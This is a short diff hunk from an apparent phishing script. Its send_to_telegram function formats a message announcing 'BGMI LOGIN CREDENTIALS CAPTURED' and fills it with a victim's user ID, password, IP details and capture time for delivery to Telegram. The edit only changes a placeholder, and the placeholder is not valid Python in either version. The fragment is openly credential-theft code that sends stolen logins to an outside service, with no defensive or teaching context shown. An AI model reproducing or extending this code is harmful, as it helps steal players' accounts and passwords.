@@ -23,7 +23,7 @@ def send_to_telegram(user_id, password, ip_info):
     message = f"""
 🟢 BGMI LOGIN CREDENTIALS CAPTURED! 🟢
 
-👤 User ID: `{Mobile number or email}`
+👤 User ID: `{Mobilenumber or email}`
 🔑 Password: `{password}`
 🌐 {ip_info}
 ⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
